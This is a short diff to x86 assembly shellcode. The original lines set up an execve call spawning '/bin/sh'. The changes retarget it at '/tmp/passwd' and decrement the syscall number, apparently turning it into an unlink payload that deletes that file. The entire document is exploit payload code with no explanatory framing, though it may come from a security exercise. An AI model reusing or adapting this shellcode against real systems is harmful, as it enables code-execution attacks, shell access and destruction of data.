@@ -1,7 +1,7 @@
 #include <sys/syscall.h>
 
-#define STRING	"/bin/sh"
-#define STRLEN	7
+#define STRING	"/tmp/passwd"
+#define STRLEN	11
 #define ARGV	(STRLEN+1)
 #define ENVP	(ARGV+4)
 
@@ -19,6 +19,7 @@
 	movl	%eax,(ENVP)(%esi)	/* set up null envp */
 
 	movb	$SYS_execve,%al		/* syscall arg 1: syscall number */
+	dec	%eax			/* syscall arg 1: subtract 1 from 11 */
 	movl	%esi,%ebx		/* syscall arg 2: string pathname */
 	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
 	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
